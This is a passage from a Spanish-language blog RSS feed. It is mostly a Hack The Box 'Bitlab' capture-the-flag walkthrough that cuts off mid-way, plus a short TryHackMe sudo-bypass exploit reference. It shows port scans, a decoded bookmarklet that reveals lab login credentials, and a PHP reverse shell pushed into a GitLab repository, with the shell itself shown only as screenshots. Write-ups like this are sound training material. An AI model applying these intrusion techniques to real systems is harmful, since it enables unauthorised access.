&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/47502&#34;&gt;&lt;strong&gt;sudo 1.8.27 - Security Bypass&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Descargamos el exploit, lo ejecutamos, obtenemos nuestra shell y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_232719.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/agentsudo/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/agentsudo/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>About</title>
        <link>https://sckull.github.io/about/</link>
        <pubDate>Thu, 30 Jan 2020 12:50:46 +0900</pubDate>
        
        <atom:modified>Thu, 30 Jan 2020 12:50:46 +0900</atom:modified>
        <guid>https://sckull.github.io/about/</guid>
        <description>TryHackMe : sckull
Telegram: TryHackMe Español
HackTheBox: sckull
Github: sckull
Twitter: @sckull
 </description>
        <content:encoded>&lt;p&gt;TryHackMe : &lt;a href=&#34;https://tryhackme.com/p/sckull&#34;&gt;sckull&lt;/a&gt;&lt;br /&gt;
Telegram: &lt;a href=&#34;https://t.me/joinchat/JWtv-VORf9qk4E0JS5g_wg&#34;&gt;TryHackMe Español&lt;/a&gt;&lt;br /&gt;
HackTheBox: &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/56644&#34;&gt;sckull&lt;/a&gt;&lt;br /&gt;
Github: &lt;a href=&#34;https://github.com/sckull/&#34;&gt;sckull&lt;/a&gt;&lt;br /&gt;
Twitter: &lt;a href=&#34;https://twitter.com/sckull_&#34;&gt;@sckull&lt;/a&gt;&lt;/p&gt;
&lt;script src=&#34;https://tryhackme.com/badge/4198&#34;&gt;&lt;/script&gt;
&lt;script src=&#34;https://www.hackthebox.eu/badge/56644&#34;&gt;&lt;/script&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        
        
        
        
        
        
      </item>
      
      <item>
        <title>Hack The Box - Bitlab</title>
        <link>https://sckull.github.io/posts/bitlab/</link>
        <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 11 Jan 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/bitlab/</guid>
        <description>Bitlab es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Bitlab es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Craft&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.114&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Makers&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/33283&#34;&gt;Frey&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/4615&#34;&gt;thek&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/bitlab# masscan -p1-65535,U:1-65535 10.10.10.114 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-24 23:21:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.114                                    
Discovered open port 22/tcp on 10.10.10.114

root@kali:~/htb/bitlab# nmap -p- --min-rate &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; 10.10.10.114
Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-09-24 19:23 EDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.114
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.34s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 133.40 seconds

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Sep 24 19:26:19 2019 as: nmap -sV -sC -p22,80 -o nmap.scan 10.10.10.114&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.114
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.083s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;55&lt;/span&gt; disallowed entries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; shown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; / /autocomplete/users /search /api /admin /profile 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /dashboard /projects/new /groups/new /groups/*/edit /users /help 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/s/ /snippets/new /snippets/*/edit
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-title: Sign in &lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;C2&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;B7 GitLab
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Requested resource was http://10.10.10.114/users/sign_in
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep 24 19:26:30 2019 -- 1 IP address (1 host up) scanned in 11.04 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Dentro del servicio de http nos muestra un panel de inicio de sesion de lo que parece gitlab.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2017.28.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Robots.txt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dentro del archivo robots.txt encontramos diferentes rutas en las cuales la mayoria nos redirige a &lt;code&gt;/users/sign_in&lt;/code&gt;, en la unica en la que podemos navegar es en &lt;code&gt;/explore&lt;/code&gt; pero en esta ruta no encontramos nada interesante.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2017.48.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar distintas rutas dentro de esta pagina encontramos que en &lt;code&gt;/help&lt;/code&gt; hay un archivo de html que al visitarlo contiene direcciones hacia otra pagina, menos la ultima que contiene codigo javascript codificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2017.48.59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bookmarks.html&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2017.50.39.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Codigo javascript:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;javascript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x76\x61\x6C\x75\x65&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x63\x6C\x61\x76\x65&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_0x4b18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Codigo decodificado:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;javascript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
	 &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;getElementById&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user_login&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;clave&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;getElementById&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;user_password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;11des0081x&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	 
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2017.56.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gitlab-login&#34;&gt;GitLab Login&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales &lt;strong&gt;clave:11des0081x&lt;/strong&gt; para iniciar sesion y vemos que hay diferentes proyectos dentro de gitlab.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.07.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---gitlab--profile&#34;&gt;SHELL - Gitlab / Profile&lt;/h2&gt;
&lt;p&gt;Dentro de los repositorios encontramos uno que tiene como nombre Profile, dentro de este repositorio se encuentra un archivo php (index.php) en el cual podemos ver codigo que pertenece a la pagina &lt;code&gt;/profile/&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;indexphp&#34;&gt;index.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.26.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;profile&#34;&gt;/profile&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.26.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos un cambio dentro del codigo de index.php y realizamos un merge para intentar modificar la pagina /profile.&lt;/p&gt;
&lt;h4 id=&#34;indexphp-1&#34;&gt;index.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.27.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;merge&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.40.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos observar que en la pagina de profile se encuentra nuestro codigo con el texto que insertamos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.42.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que sabemos que podemos modificar codigo dentro de la pagina index, vamos a intentar crear un archivo en el repositorio con una shell inversa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;hello.php&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.56.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://delta.navisec.io/reverse-shell-reference/#php&#34;&gt;&lt;strong&gt;execInBackground&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell como usuario www-data.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2018.56.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;snippet---postgres&#34;&gt;Snippet - Postgres&lt;/h3&gt;
&lt;p&gt;Dentro de gitlab tambien encontramos un snippet que contiene nombre, usuario y contraseña para una base de datos en postgres.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2020.34.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Codigo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$db_connection&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pg_connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host=localhost dbname=profiles user=profiles password=profiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pg_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$db_connection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM profiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la porcion de codigo para ejecutarlo dentro de la maquina con php, agregando una porcion de codigo para obtener el resultado del query de la tabla profiles.&lt;/p&gt;
